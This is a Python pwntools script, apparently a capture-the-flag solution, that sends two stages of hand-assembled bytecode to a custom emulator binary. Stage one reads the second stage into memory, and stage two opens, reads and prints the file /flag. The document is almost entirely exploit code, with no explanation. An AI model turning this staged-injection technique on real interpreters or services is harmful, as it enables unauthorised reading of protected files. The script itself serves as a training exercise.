#!/usr/bin/python3
from pwn import *
from sys import exit

context.binary = binary = ELF("", checksec=False)
context.log_level = "critical"
bp = ""
pack = make_packer("all")

_gdb='''
set disassembly-flavor intel
break open
#display/24g $rsp
display/8i $rip
display/x $rsi
c
'''

'''
mov = 0x80
add = 0x01
stk = 0x08
stm = 0x02
ldm = 0x20
cmp = 0x04
jmp = 0x10
sys = 0x40
    
0x404 rsp = 0x01
0x405 rip = 0x08
0x400   a = 0x20
0x401   b = 0x04
0x402   c = 0x02
0x403   d = 0x40
0x406   f = 0x10
'''
#[value][register][op]
#[op][register][value]

def _compile():
    shellcode = ""
    shellcode += "802000" # mov a, 00
    shellcode += "8004ff" # mov b, ff
    shellcode += "8002ff" # mov c, ff
    shellcode += "400120" # read(0, cb + 0xff, 255)
    size = int(len(shellcode))
    return bytes.fromhex(shellcode), size
   
def stage2(size):
    flag = ["2f", "66", "6c", "61", "67", "00"] # /flag\0
    print(str(size))
    shellcode = "00" * (int(size/2) + 1)
    for v in flag:
        shellcode += f"8020{v}" # mov a, b'flag'
        shellcode += "080020"   # push a
    shellcode += "802001"       # mov a, 01
    shellcode += "800400"       # mov b, 00
    shellcode += "400220"       # open("/flag", O_RDONLY)
    shellcode += "020401"       # *b, rsp
    shellcode += "8002ff"       # mov c, ff
    shellcode += "400120"       # read(fd, rsp, 255)
    shellcode += "802001"       # mov a, 01
    shellcode += "402020"       # write(01, rsp, 255)
    shellcode += "401020"       # exit()
    return bytes.fromhex(shellcode)

def runner():
    p = process()
    #p = gdb.debug(bp, gdbscript=_gdb, terminal=["tmux", "splitw", "-h"])
    code, size = _compile()
    p.recv()
    p.send(code)
    p.recv()
    p.send(stage2(size))
    print(p.recv().decode())
    p.close()
    p.kill()

if __name__ == '__main__':
    runner()
    try:
        with open("/flag", "r") as f:
            print(f.read())
            f.close()
    except:
        print("[!] Failed :(")
